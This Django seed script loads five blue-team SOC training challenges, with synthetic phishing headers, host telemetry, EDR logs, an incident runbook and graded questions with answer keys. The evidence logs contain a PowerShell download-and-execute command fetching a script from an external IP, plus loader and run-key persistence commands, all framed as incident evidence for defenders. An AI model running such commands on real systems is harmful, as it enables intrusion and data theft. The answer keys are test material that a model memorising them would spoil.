from django.core.management.base import BaseCommand
from django.utils import timezone
from apps.events.models.event import Event
from apps.challenges.models.challenge import Challenge
from apps.challenges.models.evidence import Evidence
from apps.questions.models.question import Question
from apps.challenges.models.challenge_question import ChallengeQuestion


EVIDENCE_TEXT_DATA = {
    "headers": {
        "filename": "email-headers.txt",
        "format": "TXT",
        "content": """Return-Path: <payroll-noreply@payroll-secure-verify.com>
Received: from mx-inbound.corp.local (10.24.8.12) by mail.corp.local
        with Microsoft SMTP Server id 15.2.986.9; Tue, 04 Feb 2026 09:14:22 -0600
Received: from smtp.payroll-secure-verify.com (185.216.71.42)
        by mx-inbound.corp.local with ESMTPS id A83F1;
        Tue, 04 Feb 2026 09:14:21 -0600
Authentication-Results: mx-inbound.corp.local;
        spf=fail (sender IP is 185.216.71.42) smtp.mailfrom=payroll-secure-verify.com;
        dkim=none (message not signed);
        dmarc=fail action=quarantine header.from=corp-payroll.com
Received-SPF: fail (mx-inbound.corp.local: domain of payroll-secure-verify.com
        does not designate 185.216.71.42 as permitted sender)
From: "Corporate Payroll" <no-reply@corp-payroll.com>
Reply-To: hr-verify@payroll-secure-verify.com
To: employee@corp.local
Subject: [ACTION REQUIRED] Verify Your Payroll Information
Date: Tue, 4 Feb 2026 09:14:20 -0600
Message-ID: <a83f1c72-payroll-verify@payroll-secure-verify.com>
MIME-Version: 1.0
Content-Type: multipart/alternative;
        boundary="----=_NextPart_000_00A2_01D9F7B2.5C4E6210"
X-Mailer: PHPMailer 6.7.1 (https://github.com/PHPMailer/PHPMailer)
X-Originating-IP: [185.216.71.42]
X-Priority: 1 (Highest)
List-Unsubscribe: <mailto:unsub@payroll-secure-verify.com>
"""
    },
    "ai-summary": {
        "filename": "ai-summary.txt",
        "format": "TXT",
        "content": """AI SOC ASSISTANT — INVESTIGATION SUMMARY
=========================================
Host: WKST-FIN-014
Analyst: ai-assistant@soc
Generated: 2026-02-05T14:22:07Z
Confidence: 82%

Summary
-------
Endpoint WKST-FIN-014 exhibited a suspicious process chain originating
from a Microsoft Office application. WINWORD.EXE spawned powershell.exe
with an encoded command, which subsequently spawned rundll32.exe. The
host initiated an outbound TLS connection to 45.147.230.19:443 shortly
after execution. This pattern matches known "living-off-the-land" loader
behavior consistent with commodity malware families.

Key Findings
------------
- Parent/child chain: WINWORD.EXE -> powershell.exe -> rundll32.exe
- Encoded PowerShell command line (~2.1 KB, base64)
- Beacon-like outbound traffic to 45.147.230.19 every 60s
- ~14 MB uploaded to external IP over a 4-minute window
- No matching allow-list entry for rundll32.exe loading %APPDATA%\\d.dat

10 Recommended Actions
----------------------
 1. Isolate WKST-FIN-014 from the network immediately.
 2. Suspend the affected user account and force credential reset.
 3. Capture volatile memory before power state changes.
 4. Block 45.147.230.19 at the perimeter firewall and web proxy.
 5. Hunt for the same parent/child chain across the fleet.
 6. Search for the file hash of d.dat in EDR telemetry.
 7. Pull mail logs for the originating document delivery vector.
 8. Preserve endpoint logs (Sysmon, PowerShell, Security) for IR.
 9. Notify the incident commander and open a ticket in the IR queue.
10. Schedule a full forensic image once the host is contained.
"""
    },
    "host-telemetry": {
        "filename": "host-telemetry.json",
        "format": "JSON",
        "content": """{
  "host": "WKST-FIN-014",
  "user": "j.morgan",
  "os": "Windows 11 Pro 23H2",
  "collected_at": "2026-02-05T14:20:11Z",
  "events": [
    { "id": 1, "ts": "14:02:11", "type": "process_start", "name": "WINWORD.EXE", "pid": 4820, "ppid": 812 },
    { "id": 2, "ts": "14:02:47", "type": "file_open", "path": "C:\\\\Users\\\\j.morgan\\\\Downloads\\\\invoice_feb.docm" },
    { "id": 3, "ts": "14:02:49", "type": "macro_enabled", "doc": "invoice_feb.docm" },
    { "id": 4, "ts": "14:02:50", "type": "process_start", "name": "powershell.exe", "pid": 6012, "ppid": 4820,
      "cmdline": "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC..." },
    { "id": 5, "ts": "14:02:52", "type": "file_write", "path": "C:\\\\Users\\\\j.morgan\\\\AppData\\\\Roaming\\\\d.dat", "size": 184320 },
    { "id": 6, "ts": "14:02:53", "type": "process_start", "name": "rundll32.exe", "pid": 6288, "ppid": 6012,
      "cmdline": "rundll32.exe C:\\\\Users\\\\j.morgan\\\\AppData\\\\Roaming\\\\d.dat,Start" },
    { "id": 7, "ts": "14:02:55", "type": "network_connect", "pid": 6288, "dst_ip": "45.147.230.19", "dst_port": 443, "protocol": "TCP" },
    { "id": 8, "ts": "14:03:55", "type": "network_connect", "pid": 6288, "dst_ip": "45.147.230.19", "dst_port": 443, "protocol": "TCP" },
    { "id": 9, "ts": "14:04:55", "type": "network_connect", "pid": 6288, "dst_ip": "45.147.230.19", "dst_port": 443, "protocol": "TCP" },
    { "id": 10, "ts": "14:05:12", "type": "file_read", "path": "C:\\\\Users\\\\j.morgan\\\\Documents\\\\finance\\\\Q4-forecast.xlsx" },
    { "id": 11, "ts": "14:05:13", "type": "file_read", "path": "C:\\\\Users\\\\j.morgan\\\\Documents\\\\finance\\\\payroll-Q1.xlsx" },
    { "id": 12, "ts": "14:05:22", "type": "network_send", "pid": 6288, "dst_ip": "45.147.230.19", "bytes": 3145728 },
    { "id": 13, "ts": "14:06:41", "type": "network_send", "pid": 6288, "dst_ip": "45.147.230.19", "bytes": 5242880 },
    { "id": 14, "ts": "14:08:02", "type": "network_send", "pid": 6288, "dst_ip": "45.147.230.19", "bytes": 6291456 },
    { "id": 15, "ts": "14:09:14", "type": "registry_set", "key": "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Updater",
      "value": "rundll32.exe C:\\\\Users\\\\j.morgan\\\\AppData\\\\Roaming\\\\d.dat,Start" }
  ],
  "indicators": {
    "processes": ["WINWORD.EXE", "powershell.exe", "rundll32.exe"],
    "files": ["invoice_feb.docm", "d.dat"],
    "network": ["45.147.230.19:443"],
    "persistence": ["HKCU\\\\...\\\\Run\\\\Updater"]
  }
}
"""
    },
    "ir-runbook": {
        "filename": "ir-runbook.txt",
        "format": "TXT",
        "content": """INCIDENT RESPONSE RUNBOOK — Lateral Movement Detected
=====================================================
Severity: HIGH
Playbook: PB-IR-014
Owner:    SOC Tier-2

Phase 1 — Preparation
  [x] Contact list validated
  [x] IR tooling deployed to all endpoints
  [x] Backup verified within last 24h

Phase 2 — Identification
  [x] EDR alert triaged (rule: T1021.002 SMB/Windows Admin Shares)
  [x] Patient zero identified: HR-LT-032
  [x] Impacted assets enumerated (see edr-events.json)
  [ ] Threat actor TTPs mapped to MITRE ATT&CK

Phase 3 — Containment
  [ ] Isolate HR-LT-032 (network quarantine)
  [ ] Disable compromised service account: svc-backup
  [ ] Block C2 IPs at perimeter: 194.180.48.71, 45.132.192.14
  [ ] Rotate credentials for privileged accounts touched by HR-LT-032

Phase 4 — Eradication
  [ ] Remove persistence (Scheduled Task \\Microsoft\\Windows\\UpdateHost)
  [ ] Delete dropped binary C:\\ProgramData\\svc\\host.exe
  [ ] Patch CVE-2025-31200 on all Windows 10 endpoints

Phase 5 — Recovery
  [ ] Restore HR-LT-032 from clean image
  [ ] Re-enable service account after rotation
  [ ] Monitor for 72h with elevated alerting

Phase 6 — Lessons Learned
  [ ] Post-incident review scheduled within 5 business days
  [ ] Update detection rules and share IOCs with peers

Escalation
----------
- Tier-3 pager:  +1-555-0100
- IR commander:  ir-lead@corp.local
- Legal / Comms: legal-oncall@corp.local
"""
    },
    "edr-events": {
        "filename": "edr-events.json",
        "format": "JSON",
        "content": """{
  "tenant": "corp",
  "generated_at": "2026-02-06T08:11:44Z",
  "events": [
    { "id": "e-1001", "ts": "07:12:03", "host": "HR-LT-032", "user": "a.patel", "type": "logon", "logon_type": 10, "src_ip": "10.24.12.44" },
    { "id": "e-1002", "ts": "07:14:22", "host": "HR-LT-032", "type": "process", "name": "powershell.exe",
      "cmdline": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://194.180.48.71/s.ps1')" },
    { "id": "e-1003", "ts": "07:14:26", "host": "HR-LT-032", "type": "network", "dst_ip": "194.180.48.71", "dst_port": 80, "bytes_out": 812 },
    { "id": "e-1004", "ts": "07:14:31", "host": "HR-LT-032", "type": "file_write", "path": "C:\\\\ProgramData\\\\svc\\\\host.exe", "sha256": "b5c3...9ef1" },
    { "id": "e-1005", "ts": "07:15:02", "host": "HR-LT-032", "type": "scheduled_task_create",
      "name": "\\\\Microsoft\\\\Windows\\\\UpdateHost", "action": "C:\\\\ProgramData\\\\svc\\\\host.exe" },
    { "id": "e-1006", "ts": "07:18:11", "host": "HR-LT-032", "type": "auth", "action": "kerberos_tgs", "target_spn": "cifs/FS-01.corp.local", "account": "svc-backup" },
    { "id": "e-1007", "ts": "07:19:44", "host": "FS-01", "type": "smb_session", "src_ip": "10.24.12.44", "share": "\\\\FS-01\\\\C$", "account": "svc-backup" },
    { "id": "e-1008", "ts": "07:20:12", "host": "FS-01", "type": "file_write", "path": "C:\\\\Windows\\\\Temp\\\\host.exe", "sha256": "b5c3...9ef1" },
    { "id": "e-1009", "ts": "07:20:22", "host": "FS-01", "type": "service_create", "name": "UpdateHost", "binpath": "C:\\\\Windows\\\\Temp\\\\host.exe" },
    { "id": "e-1010", "ts": "07:24:03", "host": "FS-01", "type": "network", "dst_ip": "45.132.192.14", "dst_port": 443, "bytes_out": 4096 },
    { "id": "e-1011", "ts": "07:31:18", "host": "DC-01", "type": "auth", "action": "kerberos_as", "account": "svc-backup", "src_ip": "10.24.12.44" },
    { "id": "e-1012", "ts": "07:31:44", "host": "DC-01", "type": "dcsync_suspected", "account": "svc-backup", "src_ip": "10.24.12.44" }
  ],
  "indicators": {
    "hashes": ["b5c3...9ef1"],
    "ips": ["194.180.48.71", "45.132.192.14"],
    "accounts": ["svc-backup"],
    "hosts": ["HR-LT-032", "FS-01", "DC-01"]
  }
}
"""
    },
    "auth-audit": {
        "filename": "auth-audit.csv",
        "format": "CSV",
        "content": """timestamp,user,host,event,result,src_ip,notes
2026-02-06T07:12:03Z,a.patel,HR-LT-032,interactive_logon,success,10.24.12.44,normal working hours
2026-02-06T07:14:22Z,a.patel,HR-LT-032,process_execution,success,10.24.12.44,powershell encoded
2026-02-06T07:18:11Z,svc-backup,HR-LT-032,tgs_request,success,10.24.12.44,SPN cifs/FS-01
2026-02-06T07:19:44Z,svc-backup,FS-01,network_logon,success,10.24.12.44,SMB session
2026-02-06T07:20:22Z,svc-backup,FS-01,service_install,success,10.24.12.44,UpdateHost
2026-02-06T07:31:18Z,svc-backup,DC-01,kerberos_ticket,success,10.24.12.44,anomalous src
2026-02-06T07:31:44Z,svc-backup,DC-01,dcsync,suspected,10.24.12.44,replication rights abused
2026-02-06T07:44:02Z,svc-backup,DC-01,ldap_query,success,10.24.12.44,enumerated domain admins
2026-02-06T08:02:19Z,svc-backup,FS-01,file_read,success,10.24.12.44,accessed \\\\Finance\\\\
2026-02-06T08:05:41Z,svc-backup,FS-01,file_read,success,10.24.12.44,accessed \\\\HR\\\\payroll
"""
    }
}


EXISTING_FIVE_CHALLENGES = [
    {
        "id": "phishnet",
        "slug": "phishnet",
        "number": 1,
        "name": "Operation PhishNet",
        "description": "Investigate a suspicious phishing email and identify malicious indicators.",
        "difficulty": "Easy",
        "duration": 20,
        "points": 100,
        "category": "Phishing",
        "skills": ["Email Forensics", "Header Analysis", "URL Reputation"],
        "objectives": [
            "Identify the spoofed sender domain",
            "Extract malicious URLs from the email body",
            "Determine the phishing technique used",
        ],
        "brief": "A finance employee reported a suspicious email requesting an urgent wire transfer. Analyze the message headers, embedded links, and attachments to determine whether this is a phishing attempt and identify the indicators of compromise.",
        "resources": [
            {"name": "Email Screenshot", "type": "PNG", "size": "312 KB", "evidenceId": "email"},
            {"name": "Email Headers", "type": "TXT", "size": "4 KB", "evidenceId": "headers"},
            {"name": "URL Analysis Report", "type": "PNG", "size": "268 KB", "evidenceId": "url"},
        ],
        "evidence": [
            {"id": "email", "label": "Email Screenshot", "filename": "email-screenshot.png", "image": "/__EVIDENCE_EMAIL__", "format": "PNG", "size": "312 KB"},
            {"id": "headers", "label": "Email Headers", "filename": "email-headers.png", "image": "/__EVIDENCE_HEADERS__", "format": "TXT", "size": "4 KB"},
            {"id": "url", "label": "URL Analysis Report", "filename": "url-analysis.png", "image": "/__EVIDENCE_URL__", "format": "PNG", "size": "268 KB"},
        ],
        "questions": [
            {
                "id": "q1",
                "prompt": "What is the spoofed sender domain?",
                "kind": "text",
                "correct_answer": "payroll-secure-verify.com",
                "points": 30,
            },
            {
                "id": "q2",
                "prompt": "Identify the suspicious URL.",
                "kind": "text",
                "correct_answer": "http://payroll-secure-verify.com",
                "points": 35,
            },
            {
                "id": "q3",
                "prompt": "List three phishing indicators found in this email.",
                "kind": "text",
                "correct_answer": "SPF fail, DMARC fail, Spoofed From header",
                "points": 35,
            },
        ],
    },
    {
        "id": "alert-storm",
        "slug": "alert-storm",
        "number": 2,
        "name": "Alert Storm",
        "description": "Analyze SIEM / Wazuh alerts and identify the security incident.",
        "difficulty": "Medium",
        "duration": 30,
        "points": 150,
        "category": "SIEM",
        "skills": ["SIEM Analysis", "Wazuh", "Log Correlation"],
        "objectives": [
            "Correlate related alerts across sources",
            "Identify the attacker source IP",
            "Rate the severity of the incident",
        ],
        "brief": "Multiple security alerts were triggered in the environment within a short window. Analyze the Wazuh alerts, system logs, and network captures to correlate the events and answer the questions below.",
        "resources": [
            {"name": "wazuh-alerts.json", "type": "JSON", "size": "24 KB", "evidenceId": "wazuh"},
            {"name": "system.log", "type": "Log", "size": "112 KB", "evidenceId": "syslog"},
            {"name": "network-flows.csv", "type": "CSV", "size": "56 KB", "evidenceId": "network"},
        ],
        "evidence": [
            {"id": "wazuh", "label": "Wazuh Dashboard", "filename": "wazuh-dashboard.png", "image": "/__EVIDENCE_WAZUH__", "format": "JSON", "size": "24 KB"},
            {"id": "syslog", "label": "System Log", "filename": "system.log.png", "image": "/__EVIDENCE_SYSLOG__", "format": "LOG", "size": "112 KB"},
            {"id": "network", "label": "Network Flows", "filename": "network-flows.png", "image": "/__EVIDENCE_NETWORK__", "format": "CSV", "size": "56 KB"},
        ],
        "questions": [
            {
                "id": "q1",
                "prompt": "What type of attack was detected?",
                "kind": "text",
                "correct_answer": "Brute Force / Password Spray",
                "points": 35,
            },
            {
                "id": "q2",
                "prompt": "What is the source IP address of the attacker?",
                "kind": "text",
                "correct_answer": "198.51.100.45",
                "points": 40,
            },
            {
                "id": "q3",
                "prompt": "What was the compromised user account?",
                "kind": "text",
                "correct_answer": "j.doe",
                "points": 40,
            },
            {
                "id": "q4",
                "prompt": "What is the severity of this incident?",
                "kind": "mcq",
                "options": ["Low", "Medium", "High", "Critical"],
                "correct_answer": "High",
                "points": 35,
            },
        ],
    },
    {
        "id": "ai-defender",
        "slug": "ai-defender",
        "number": 3,
        "name": "AI Defender",
        "description": "Use AI to investigate a security scenario and produce the best response.",
        "difficulty": "Medium",
        "duration": 25,
        "points": 100,
        "category": "AI",
        "skills": ["AI Tooling", "Threat Analysis", "Response Playbooks"],
        "objectives": [
            "Validate the AI findings against raw evidence",
            "Identify the suspicious process chain",
            "Determine the malicious destination IP",
            "Identify evidence of possible data staging or exfiltration",
            "Decide whether the AI recommendation should be trusted",
        ],
        "brief": "An AI-powered SOC Assistant has flagged suspicious activity on an internal workstation. The assistant generated an investigation summary after analyzing endpoint telemetry. Your task is NOT to blindly trust the AI. Review both the AI-generated summary and the raw host telemetry to determine whether the AI's conclusions are accurate. Validate every important finding using the available evidence before answering.",
        "resources": [
            {"name": "ai-summary.txt", "type": "Text", "size": "4 KB", "evidenceId": "ai-summary"},
            {"name": "host-telemetry.json", "type": "JSON", "size": "18 KB", "evidenceId": "host-telemetry"},
        ],
        "evidence": [
            {"id": "ai-summary", "label": "AI Summary", "filename": "ai-summary.png", "image": "/__EVIDENCE_AI_SUMMARY__", "format": "TXT", "size": "4 KB"},
            {"id": "host-telemetry", "label": "Host Telemetry", "filename": "host-telemetry.png", "image": "/__EVIDENCE_HOST_TELEMETRY__", "format": "JSON", "size": "18 KB"},
        ],
        "questions": [
            {
                "id": "q1",
                "prompt": "What suspicious process execution was detected on the endpoint?",
                "kind": "text",
                "correct_answer": "WINWORD.EXE -> powershell.exe -> rundll32.exe",
                "points": 25,
            },
            {
                "id": "q2",
                "prompt": "Which external IP address did the compromised host communicate with?",
                "kind": "text",
                "correct_answer": "45.147.230.19",
                "points": 25,
            },
            {
                "id": "q3",
                "prompt": "What evidence suggests possible data exfiltration?",
                "kind": "text",
                "correct_answer": "Network send events totaling ~14MB to 45.147.230.19 after reading Q4-forecast.xlsx and payroll-Q1.xlsx",
                "points": 25,
            },
            {
                "id": "q4",
                "prompt": "Should the AI's containment recommendation be trusted? Justify your answer using the raw telemetry.",
                "kind": "text",
                "correct_answer": "Yes, host telemetry confirms malware execution, C2 connection, data exfiltration, and persistence registry key creation.",
                "points": 25,
            },
        ],
    },
    {
        "id": "incident-zero",
        "slug": "incident-zero",
        "number": 4,
        "name": "Incident Zero",
        "description": "Respond to a real-world security incident using incident response methodology.",
        "difficulty": "Hard",
        "duration": 35,
        "points": 250,
        "category": "Incident Response",
        "skills": ["Incident Response", "Triage", "Containment"],
        "objectives": [
            "Classify the incident type",
            "Identify patient zero",
            "Choose the correct IR phase to execute next",
        ],
        "brief": "A critical alert indicates lateral movement across the network. Follow the incident response lifecycle to triage, contain, and document the incident.",
        "resources": [
            {"name": "ir-runbook.txt", "type": "Text", "size": "6 KB", "evidenceId": "ir-runbook"},
            {"name": "edr-events.json", "type": "JSON", "size": "42 KB", "evidenceId": "edr-events"},
            {"name": "auth-audit.csv", "type": "CSV", "size": "28 KB", "evidenceId": "auth-audit"},
        ],
        "evidence": [
            {"id": "ir-runbook", "label": "IR Runbook", "filename": "ir-runbook.png", "image": "/__EVIDENCE_IR_RUNBOOK__", "format": "TXT", "size": "6 KB"},
            {"id": "edr-events", "label": "EDR Events", "filename": "edr-events.png", "image": "/__EVIDENCE_EDR_EVENTS__", "format": "JSON", "size": "42 KB"},
            {"id": "auth-audit", "label": "Auth Audit", "filename": "auth-audit.png", "image": "/__EVIDENCE_AUTH_AUDIT__", "format": "CSV", "size": "28 KB"},
        ],
        "questions": [
            {
                "id": "q1",
                "prompt": "Which endpoint is patient zero?",
                "kind": "text",
                "correct_answer": "HR-LT-032",
                "points": 60,
            },
            {
                "id": "q2",
                "prompt": "Which IR phase should be executed next?",
                "kind": "mcq",
                "options": ["Identification", "Containment", "Eradication", "Recovery"],
                "correct_answer": "Containment",
                "points": 60,
            },
            {
                "id": "q3",
                "prompt": "What is the primary lateral movement technique observed?",
                "kind": "text",
                "correct_answer": "SMB / Windows Admin Shares (T1021.002) using stolen service account svc-backup",
                "points": 65,
            },
            {
                "id": "q4",
                "prompt": "What is the recommended immediate containment action?",
                "kind": "text",
                "correct_answer": "Isolate HR-LT-032, disable svc-backup, block C2 IPs 194.180.48.71 and 45.132.192.14",
                "points": 65,
            },
        ],
    },
    {
        "id": "final-hunt",
        "slug": "final-hunt",
        "number": 5,
        "name": "Final Hunt",
        "description": "Perform digital forensics and build the complete attack timeline.",
        "difficulty": "Hard",
        "duration": 40,
        "points": 400,
        "category": "Digital Forensics",
        "skills": ["Digital Forensics", "Timeline Analysis", "Threat Hunting"],
        "objectives": [
            "Reconstruct the attack timeline",
            "Identify the initial access vector",
            "Determine the total dwell time",
        ],
        "brief": "You have full forensic artifacts from a completed intrusion. Analyze the evidence and reconstruct the attacker's timeline from initial access to actions on objectives.",
        "resources": [
            {"name": "disk-image-summary.txt", "type": "Text", "size": "12 KB", "evidenceId": "disk-summary"},
            {"name": "memory-strings.log", "type": "Log", "size": "320 KB", "evidenceId": "memory-strings"},
            {"name": "timeline.csv", "type": "CSV", "size": "48 KB", "evidenceId": "timeline"},
            {"name": "network-capture.pcap", "type": "PCAP", "size": "1.2 MB", "evidenceId": "pcap"},
        ],
        "evidence": [
            {"id": "disk-summary", "label": "Disk Image Summary", "filename": "disk-image-summary.txt", "image": "/__EVIDENCE_DISK_SUMMARY__", "format": "TXT", "size": "12 KB"},
            {"id": "memory-strings", "label": "Memory Strings", "filename": "memory-strings.log", "image": "/__EVIDENCE_MEMORY_STRINGS__", "format": "LOG", "size": "320 KB"},
            {"id": "timeline", "label": "Timeline", "filename": "timeline.csv", "image": "/__EVIDENCE_TIMELINE__", "format": "CSV", "size": "48 KB"},
            {"id": "pcap", "label": "Network Capture", "filename": "network-capture.pcap", "image": "/__EVIDENCE_PCAP__", "format": "PNG", "size": "1.2 MB"},
        ],
        "questions": [
            {
                "id": "q1",
                "prompt": "What suspicious file was downloaded and executed during the initial stage of the intrusion?",
                "kind": "text",
                "correct_answer": "update.ps1",
                "points": 80,
            },
            {
                "id": "q2",
                "prompt": "At what time was the incident detected?",
                "kind": "text",
                "correct_answer": "09:10:22 UTC|09:10:22",
                "points": 80,
            },
            {
                "id": "q3",
                "prompt": "Which persistence technique was used by the attacker?",
                "kind": "text",
                "correct_answer": "Registry Run Key persistence.|Registry Run Key",
                "points": 80,
            },
            {
                "id": "q4",
                "prompt": "Which external IP address was repeatedly contacted by the compromised workstation?",
                "kind": "text",
                "correct_answer": "185.220.101.32",
                "points": 80,
            },
            {
                "id": "q5",
                "prompt": "Which file was prepared and attempted to be transferred from the compromised workstation?",
                "kind": "text",
                "correct_answer": "backup.zip|backup.zip — containing Finance, HR, and Passwords.xlsx data.",
                "points": 80,
            },
        ],
    },
]


class Command(BaseCommand):
    help = "Seeds PostgreSQL database idempotently with the existing 5 lead's challenges."

    def handle(self, *args, **options):
        self.stdout.write(self.style.SUCCESS("Starting idempotent seeding of existing 5 lead's challenges..."))

        event, _ = Event.objects.get_or_create(
            event_code="VRSEC-2026",
            defaults={
                "workshop_name": "VRSEC National SOC Blue Team Championship 2026",
                "college_name": "VRSEC",
                "event_date": timezone.now().date(),
                "passing_score": 300,
                "total_challenges": 5,
                "status": "Completed",
            }
        )

        for item in EXISTING_FIVE_CHALLENGES:
            challenge, created = Challenge.objects.update_or_create(
                challenge_number=item["number"],
                defaults={
                    "slug": item["slug"],
                    "name": item["name"],
                    "description": item["description"],
                    "brief": item["brief"],
                    "difficulty": item["difficulty"],
                    "duration_minutes": item["duration"],
                    "points": item["points"],
                    "skills": item["skills"],
                    "objectives": item["objectives"],
                }
            )

            action_str = "Created" if created else "Updated"
            self.stdout.write(f"  [+] {action_str} Challenge {challenge.challenge_number}: {challenge.name} ({challenge.slug})")

            # Seed Evidence Files
            for ev_item in item.get("evidence", []):
                art_key = ev_item["id"]
                txt_info = EVIDENCE_TEXT_DATA.get(art_key)
                content_text = txt_info["content"] if txt_info else ""
                fmt = txt_info["format"] if txt_info else ev_item.get("format", "PNG")

                Evidence.objects.update_or_create(
                    challenge=challenge,
                    artifact_key=art_key,
                    defaults={
                        "label": ev_item["label"],
                        "filename": ev_item["filename"],
                        "file_format": fmt,
                        "content_text": content_text,
                        "image_url": ev_item["image"],
                        "file_size_display": ev_item.get("size", "4 KB"),
                    }
                )

            # Seed Questions - clear stale links first
            ChallengeQuestion.objects.filter(challenge=challenge).delete()

            for pos, q_item in enumerate(item.get("questions", []), start=1):
                question, _ = Question.objects.update_or_create(
                    category=item["category"],
                    question_text=q_item["prompt"],
                    defaults={
                        "difficulty": item["difficulty"],
                        "kind": q_item.get("kind", "text"),
                        "options_json": q_item.get("options", []),
                        "correct_answer": q_item.get("correct_answer", ""),
                        "default_points": q_item.get("points", 25),
                        "status": "Published",
                    }
                )

                ChallengeQuestion.objects.create(
                    challenge=challenge,
                    question=question,
                    position=pos
                )

        self.stdout.write(self.style.SUCCESS("Successfully seeded all 5 existing challenges into PostgreSQL!"))
